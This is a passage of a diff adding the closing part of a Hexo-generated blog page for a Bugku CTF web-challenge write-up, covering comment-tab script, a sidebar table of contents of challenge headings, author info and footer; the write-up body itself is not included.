+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#NEW-bugku-writeup"><span class="nav-number">1.</span> <span class="nav-text">NEW-bugku-writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web1"><span class="nav-number">1.1.</span> <span class="nav-text">web1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web2"><span class="nav-number">1.2.</span> <span class="nav-text">web2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web3-php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.3.</span> <span class="nav-text">web3 php伪协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web4-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="nav-number">1.4.</span> <span class="nav-text">web4  万能密码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web5-sql%E6%B3%A8%E5%85%A5"><span class="nav-number">1.5.</span> <span class="nav-text">web5  sql注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web6"><span class="nav-number">1.6.</span> <span class="nav-text">web6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web7"><span class="nav-number">1.7.</span> <span class="nav-text">web7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web8"><span class="nav-number">1.8.</span> <span class="nav-text">web8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web9"><span class="nav-number">1.9.</span> <span class="nav-text">web9</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web10"><span class="nav-number">1.10.</span> <span class="nav-text">web10</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web11"><span class="nav-number">1.11.</span> <span class="nav-text">web11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web12"><span class="nav-number">1.12.</span> <span class="nav-text">web12</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web13"><span class="nav-number">1.13.</span> <span class="nav-text">web13</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web14"><span class="nav-number">1.14.</span> <span class="nav-text">web14</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web15"><span class="nav-number">1.15.</span> <span class="nav-text">web15</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web16-%E5%BE%85%E7%BB%AD%E2%80%A6"><span class="nav-number">1.16.</span> <span class="nav-text">web16 待续….</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-number">1.17.</span> <span class="nav-text">流量分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="nav-number">1.18.</span> <span class="nav-text">日志分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web18"><span class="nav-number">1.19.</span> <span class="nav-text">web18</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web19-%E5%BE%85%E7%BB%AD%E2%80%A6"><span class="nav-number">1.20.</span> <span class="nav-text">web19  待续….</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web20"><span class="nav-number">1.21.</span> <span class="nav-text">web20</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web21"><span class="nav-number">1.22.</span> <span class="nav-text">web21</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web22"><span class="nav-number">1.23.</span> <span class="nav-text">web22</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web23"><span class="nav-number">1.24.</span> <span class="nav-text">web23</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web24"><span class="nav-number">1.25.</span> <span class="nav-text">web24</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web25"><span class="nav-number">1.26.</span> <span class="nav-text">web25</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Erlee"
+      src="/images/erlee.png">
+  <p class="site-author-name" itemprop="name">Erlee</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">豫ICP备 19040334号-1 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Erlee</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
